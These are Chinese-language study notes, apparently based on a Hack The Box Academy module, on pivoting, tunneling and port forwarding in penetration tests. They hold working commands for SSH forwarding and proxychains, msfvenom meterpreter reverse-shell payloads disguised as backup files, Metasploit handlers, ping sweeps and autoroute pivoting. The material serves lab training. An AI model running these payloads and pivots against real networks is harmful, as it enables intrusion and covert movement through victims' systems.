# Pivoting &隧道和端口转发

## 一、介绍

### 1. 简介

![](https://academy.hackthebox.com/storage/modules/158/PivotingandTunnelingVisualized.gif)

在红队参与、渗透测试或 Active Directory 评估期间，我们经常会发现自己可能已经泄露了所需的凭据、ssh 密钥、哈希或访问令牌以移动到另一台主机，但可能有 不能从我们的攻击主机直接访问其他主机。 在这种情况下，我们可能需要使用我们已经妥协的枢轴主机来找到通往下一个目标的方法。 首次登陆主机时要做的最重要的事情之一是检查我们的权限级别、网络连接和潜在的 VPN 或其他远程访问软件。 如果一台主机有多个网络适配器，我们很可能会使用它来移动到不同的网段。 Pivoting 本质上是通过受感染的主机移动到其他网络以在不同网段上找到更多目标的想法。

Pivoting 的主要用途是打破分段（物理和虚拟）以访问隔离网络。另一方面，隧道是 Pivoting 的一个子集。隧道将网络流量封装到另一个协议中并通过它路由流量。

## 二、Choosing The Dig Site & Starting Our Tunnels

### 1. 使用 SSH 和 SOCKS 隧道的动态端口转发

> 端口转发是一种允许我们将通信请求从一个端口重定向到另一个端口的技术。端口转发使用 TCP 作为主要通信层，为转发的端口提供交互式通信。但是，可以使用SSH甚至 SOCKS（非应用层）等不同的应用层协议来封装转发的流量。这可以有效绕过防火墙并使用受感染主机上的现有服务转向其他网络

#### 1. SSH 本地端口转发

![](https://academy.hackthebox.com/storage/modules/158/11.png)

1.  执行本地端口转发

    ```shell
    # 攻击机执行， 作用是告诉 SSH 客户端请求 SSH 服务器将我们通过端口 1234 发送的所有数据转发到 Ubuntu 服务器上的 localhost:3306
    ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64
    # 使用 Netstat 确认端口转发
    netstat -antp | grep 1234
    # 使用 Nmap 确认端口转发
    nmap -v -sV -p1234 localhost
    ```
2.  设置枢纽： `经过发现 Ubuntu 服务器有多个网卡： 10.129.202.64/172.16.5.129`

    > 现在我们需要知道在 172.16.5.0/23 范围上的主机，所以我们需要通过 Ubuntu 服务器转发我们的数据包，因此我们可以在本地启动一个 SOCKS 侦听器来完成次操作，然后配置 SSH 以在连接到目标主机后通过 SSH 将流量转发到 172.16.5.0/23

    ![](https://academy.hackthebox.com/storage/modules/158/22.png)

    ```shell
    # 攻击主机： 启用 SSH 动态端口转发，
    ssh -D 9050 ubuntu@10.129.202.64

    # 配置 proxychains
    tail -4 /etc/proxychains.conf
    	socks4 	127.0.0.1 9050

    # 使用 proxychains， 配合 nmap 的使用
    proxychains nmap -v -sn 172.16.5.1-200
    ```

### 2. 使用 SSH 进行远程/反向端口转发

> SSH 可以侦听我们本地主机并将远程主机的服务转发到我们的端口以及动态端口转发，我们也可以通过枢轴主机将数据报发送到远程网络，但有时我们可能也希望将本地服务转发到远程端口

![](https://academy.hackthebox.com/storage/modules/158/33.png)

```shell
# 使用 msfvenom 为 Windows A 创建 Windows 负载，并传送到枢轴主机
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

# 开启 MSF 监听
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000

# 在枢轴主机启动方法将 backupscript.exe 传送到 Windows A  主机,并执行
# 在攻击主机执行
ssh -R 172.15.5.19:8080:0.0.0.0:8000 ubuntu@10.129.15.50 -vN
```

最后结果实现图:

![](https://academy.hackthebox.com/storage/modules/158/44.png)

### 3. Meterpreter 隧道和端口转发

> 现在让我们考虑这样一个场景，我们在 Ubuntu 服务器（枢轴主机）上有我们的 Meterpreter shell 访问权限，我们想通过枢轴主机执行枚举扫描，但我们想利用 Meterpreter 会话给我们带来的便利 . 在这种情况下，我们仍然可以在不依赖 SSH 端口转发的情况下使用 Meterpreter 会话创建一个数据透视表。 我们可以使用以下命令为 Ubuntu 服务器创建一个 Meterpreter shell，它将在我们的攻击主机上的端口 8080 上返回一个 shell。

```shell
# 为 Ubuntu 主机创建有效负载，并传输到 Ubuntu 服务器上执行
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

# 配置有效负载
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp

# 建立 SHELL 会话后
# 使用 MSF 执行 ping 扫描
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
# Linux 的 Ping 扫描
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
# 使用 CMD 的扫描
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
# 使用 Powershell 的 ping 扫描
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}


# 配置 MSF 的 SOCKS 代理， 并配置 proxychains 配置文件
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a

# 最后，我们需要告诉我们的 socks_proxy 模块通过我们的 Meterpreter 会话路由所有流量。 我们可以使用 Metasploit 的 post/multi/manage/autoroute 模块为 172.16.5.0 子网添加路由，然后路由我们所有的代理链流量。
# 第一种： 使用 AUtoRoute 创建路线
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
# 第二种： 通过从 Meterpreter 会话运行 autoroute 来添加带有 autoroute 的路由
meterpreter > run autoroute -s 172.16.5.0/23

# 列出活动路由
meterpreter > run autoroute -p
```
